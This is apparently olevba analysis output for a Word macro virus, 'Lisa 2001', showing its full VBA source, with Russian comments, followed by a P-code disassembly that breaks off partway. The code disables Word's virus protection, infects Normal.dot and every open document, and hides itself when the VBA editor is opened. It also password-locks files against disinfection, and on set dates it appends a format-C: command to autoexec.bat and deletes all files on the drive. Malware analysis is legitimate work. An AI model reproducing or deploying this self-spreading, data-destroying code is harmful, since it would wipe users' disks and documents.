olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lis.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lis.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'L i s a 2001
'Все пожелания (а также новые вири) слать на Slava_Atrancev@mail.ru
Dim dvl
Private Sub Document_Close()
 dvl = 2
 p
End Sub
Private Sub Document_New()
 dvl = 3
 p
End Sub
Private Sub Document_Open()
 dvl = 1
 p
End Sub

Private Sub p()
 '___Включаем генератор случайных чисел___'
 Randomize
 '___Вырубаем ошибки___'
 On Error Resume Next
 '___Отключение защиты от вирусов для ворда 97___'
 Application.Options.VirusProtection = False
 '___Отключение защиты от вирусов для ворда 2000___'
 System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security", "level") = 1
 If ThisDocument.Name <> "Normal.dot" Then
  '___Если выполняется не из нормала то ...___'
  '___Вытираем нормал дот___'
  a = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a
  '___Пишем в нормал дот наш код___'
  a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a)
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines 1, b
  '___Добавляем в нормал технологию стелс___'
  c = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 1, "Sub viewvbcode()"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 2, "On Error Resume Next"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 3, "a = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 4, "NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 5, "NormalTemplate.Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 6, "c = Application.Documents.Count"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 7, "For i = 1 To c"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 8, "d = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 9, "If d > 0 Then"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 10, "Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, d"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 11, "Application.Documents.Item(i).Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 12, "End If"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 13, "Next i"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 14, "Application.ShowVisualBasicEditor = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 15, "End Sub"
  '___Мелкая пакость антивирусникам, при закрытии паролируем документ на изменение, а при открытии снимаем пароль и после лечения, юзверь не сможет юзать этот файл___'
  If dvl = 2 Then
   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:="vcdjgsqbxcly"
   ThisDocument.Save
   ThisDocument.Saved = True
  End If
  If dvl = 1 Then
   ThisDocument.Unprotect Password:="vcdjgsqbxcly"
   aa = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   cc = ""
   For dd = 1 To 12
    ee = 0
    Do While ee < 97
    '___Генерируем пароль случайным образом___'
     ee = Int((122 * Rnd) + 1)
    Loop
    cc = cc + Chr(ee)
   Next dd
   For bb = 1 To aa
    nn = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(bb, 1)
    If Mid(nn, 1, 63) = "   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:=" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine bb, "   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:=" + Chr(34) + cc + Chr(34)
    End If
    If Mid(nn, 1, 36) = "   ThisDocument.Unprotect Password:=" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine bb, "   ThisDocument.Unprotect Password:=" + Chr(34) + cc + Chr(34)
    End If
   Next bb
  End If
 Else
  '___Если выполняется из нормала то ...___'
  '___Запоминаем код без процедуры стелс___'
  a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  d = ""
  For i = 1 To a
   b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   If b = "Sub viewvbcode()" Then i = a + 1 Else d = d + b + Chr(13)
  Next i
  '___Пишем код во все открытые файлы___'
  a = Application.Documents.Count
  For i = 1 To a
   b = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, b
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.insertlines 1, d
  Next i
 End If
 '___Проверяем наличие метки "Свой-Чужой"
 Set a = Application.FileSearch
 Set b = Application.FileSearch
 With a
  .LookIn = "c:\windows\system\"
  .FileName = "lisa.dll"
  '___Если метки нет, убиваем все подряд___'
  If .Execute = 0 Then
   If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) _
   Or (Day(Now()) = 10) And (Month(Now()) = 1) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 7) Or (Day(Now()) = 13) And (Month(Now()) = 12) Then
    Open "c:\autoexec.bat" For Append As #1
     Print #1, "echo y|FORMAT c: /q >nul"
    Close #1
    With b
     .LookIn = "c:\"
     .FileName = "*.doc"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
    With b
     .LookIn = "c:\"
     .FileName = "*.xls"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
    With b
     .LookIn = "c:\"
     .FileName = "*.*"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
   End If
  End If
 End With
End Sub






























































































































































































































































































































































































































































































































































































































































































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lis.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 26763 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x000C "L i s a 2001"
' Line #2:
' 	QuoteRem 0x0000 0x0042 "Все пожелания (а также новые вири) слать на Slava_Atrancev@mail.ru"
' Line #3:
' 	Dim 
' 	VarDefn dvl
' Line #4:
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' 	LitDI2 0x0002 
' 	St dvl 
' Line #6:
' 	ArgsCall p 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub Document_New())
' Line #9:
' 	LitDI2 0x0003 
' 	St dvl 
' Line #10:
' 	ArgsCall p 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Private Sub Document_Open())
' Line #13:
' 	LitDI2 0x0001 
' 	St dvl 
' Line #14:
' 	ArgsCall p 0x0000 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Private Sub p())
' Line #18:
' 	QuoteRem 0x0001 0x0029 "___Включаем генератор случайных чисел___'"
' Line #19:
' 	ArgsCall Read 0x0000 
' Line #20:
' 	QuoteRem 0x0001 0x0016 "___Вырубаем ошибки___'"
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	QuoteRem 0x0001 0x0030 "___Отключение защиты от вирусов для ворда 97___'"
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #24:
' 	QuoteRem 0x0001 0x0032 "___Отключение защиты от вирусов для ворда 2000___'"
' Line #25:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #26:
' 	Ld ThisDocument 
' 	MemLd New 
' 	LitStr 0x000A "Normal.dot"
' 	Ne 
' 	IfBlock 
' Line #27:
' 	QuoteRem 0x0002 0x002C "___Если выполняется не из нормала то ...___'"
' Line #28:
' 	QuoteRem 0x0002 0x001A "___Вытираем нормал дот___'"
' Line #29:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #31:
' 	QuoteRem 0x0002 0x0021 "___Пишем в нормал дот наш код___'"
' Line #32:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St B 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld B 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #35:
' 	QuoteRem 0x0002 0x002A "___Добавляем в нормал технологию стелс___'"
' Line #36:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St c 
' Line #37:
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0010 "Sub viewvbcode()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #38:
' 	Ld c 
' 	LitDI2 0x0002 
' 	Add 
' 	LitStr 0x0014 "On Error Resume Next"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #39:
' 	Ld c 
' 	LitDI2 0x0003 
' 	Add 
' 	LitStr 0x0049 "a = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #40:
' 	Ld c 
' 	LitDI2 0x0004 
' 	Add 
' 	LitStr 0x0049 "NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #41:
' 	Ld c 
' 	LitDI2 0x0005 
' 	Add 
' 	LitStr 0x001B "NormalTemplate.Saved = True"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #42:
' 	Ld c 
' 	LitDI2 0x0006 
' 	Add 
' 	LitStr 0x001F "c = Application.Documents.Count"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #43:
' 	Ld c 
' 	LitDI2 0x0007 
' 	Add 
' 	LitStr 0x000E "For i = 1 To c"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #44:
' 	Ld c 
' 	LitDI2 0x0008 
' 	Add 
' 	LitStr 0x0058 "d = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #45:
' 	Ld c 
' 	LitDI2 0x0009 
' 	Add 
' 	LitStr 0x000D "If d > 0 Then"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #46:
' 	Ld c 
' 	LitDI2 0x000A 
' 	Add 
' 	LitStr 0x0058 "Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, d"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #47:
' 	Ld c 
' 	LitDI2 0x000B 
' 	Add 
' 	LitStr 0x002A "Application.Documents.Item(i).Saved = True"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #48:
' 	Ld c 
' 	LitDI2 0x000C 
' 	Add 
' 	LitStr 0x0006 "End If"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #49:
' 	Ld c 
' 	LitDI2 0x000D 
' 	Add 
' 	LitStr 0x0006 "Next i"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #50:
' 	Ld c 
' 	LitDI2 0x000E 
' 	Add 
' 	LitStr 0x0028 "Application.ShowVisualBasicEditor = True"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #51:
' 	Ld c 
' 	LitDI2 0x000F 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #52:
' 	QuoteRem 0x0002 0x00A4 "___Мелкая пакость антивирусникам, при закрытии паролируем документ на изменение, а при открытии снимаем пароль и после лечения, юзверь не сможет юзать этот файл___'"
' Line #53:
' 	Ld dvl 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #54:
' 	Ld wdAllowOnlyFormFields 
' 	ParamNamed TypeOf 
' 	LitStr 0x000C "vcdjgsqbxcly"
' 	ParamNamed Password 
' 	Ld ThisDocument 
' 	ArgsMemCall Protect 0x0002 
' Line #55:
' 	Ld ThisDocument 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	LitVarSpecial (True)
' 	Ld ThisDocument 
' 	MemSt Saved 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld dvl 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitStr 0x000C "vcdjgsqbxcly"
' 	ParamNamed Password 
' 	Ld ThisDocument 
' 	ArgsMemCall Unprotect 0x0001 
' Line #60:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St aa 
' Line #61:
' 	LitStr 0x0000 ""
' 	St cc 
' Line #62:
' 	StartForVariable 
' 	Ld dd 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000C 
' 	For 
' Line #63:
' 	LitDI2 0x0000 
' 	St ee 
' Line #64:
' 	Ld ee 
' 	LitDI2 0x0061 
' 	Lt 
' 	DoWhile 
' Line #65:
' 	QuoteRem 0x0004 0x002A "___Генерируем пароль случайным образом___'"
' Line #66:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St ee 
' Line #67:
' 	Loop 
' Line #68:
' 	Ld cc 
' 	Ld ee 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St cc 
' Line #69:
' 	StartForVariable 
' 	Ld dd 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	StartForVariable 
' 	Ld bb 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aa 
' 	For 
' Line #71:
' 	Ld bb 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St nn 
' Line #72:
' 	Ld nn 
' 	LitDI2 0x0001 
' 	LitDI2 0x003F 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x003F "   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:="
' 	Eq 
' 	IfBlock 
' Line #73:
' 	Ld bb 
' 	LitStr 0x003F "   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld cc 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Ld nn 
' 	LitDI2 0x0001 
' 	LitDI2 0x0024 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0024 "   ThisDocument.Unprotect Password:="
' 	Eq 
' 	IfBlock 
' Line #76:
' 	Ld bb 
' 	LitStr 0x0024 "   ThisDocument.Unprotect Password:="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld cc 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Ld bb 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	ElseBlock 
' Line #81:
' 	QuoteRem 0x0002 0x0029 "___Если выполняется из нормала то ...___'"
' Line #82:
' 	QuoteRem 0x0002 0x0029 "___Запоминаем код без процедуры стелс___'"
' Line #83:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #84:
' 	LitStr 0x0000 ""
' 	St d 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #86:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St B 
' Line #87:
' 	Ld B 
' 	LitStr 0x0010 "Sub viewvbcode()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld a 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' 	Else 
' 	BoSImplicit 
' 	Ld d 
' 	Ld B 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d 
' 	EndIf 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	QuoteRem 0x0002 0x0026 "___Пишем код во все открытые файлы___'"
' Line #90:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St a 
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #92:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St B 
' Line #93:
' 	LitDI2 0x0001 
' 	Ld B 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #94:
' 	LitDI2 0x0001 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	QuoteRem 0x0001 0x0027 "___Проверяем наличие метки "Свой-Чужой""
' Line #98:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set a 
' Line #99:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set B 
' Line #100:
' 	StartWithExpr 
' 	Ld a 
' 	With 
' Line #101:
' 	LitStr 0x0012 "c:\windows\system\"
' 	MemStWith LookIn 
' Line #102:
' 	LitStr 0x0008 "lisa.dll"
' 	MemStWith FileName 
' Line #103:
' 	QuoteRem 0x0002 0x0029 "___Если метки нет, убиваем все подряд___'"
' Line #104:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #105:
' 	LineCont 0x0004 58 00 03 00
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Paren 
' 	And 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Paren 
' 	And 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Paren 
' 	And 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Paren 
' 	And 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	And 
' 	Or 
' 	IfBlock 
' Line #106:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "echo y|FORMAT c: /q >nul"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #109:
' 	StartWithExpr 
' 	Ld B 
' 	With 
' Line #110:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' Line #111:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #112:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #113:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #114:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #115:
' 	Ld y 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #116:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	EndWith 
' Line #119:
' 	StartWithExpr 
' 	Ld B 
' 	With 
' Line #120:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' Line #121:
' 	LitStr 0x0005 "*.xls"
' 	MemStWith FileName 
' Line #122:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #123:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #124:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #125:
' 	Ld y 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #126:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	EndWith 
' Line #129:
' 	StartWithExpr 
' 	Ld B 
' 	With 
' Line #130:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' Line #131:
' 	LitStr 0x0003 "*.*"
' 	MemStWith FileName 
' Line #132:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #133:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
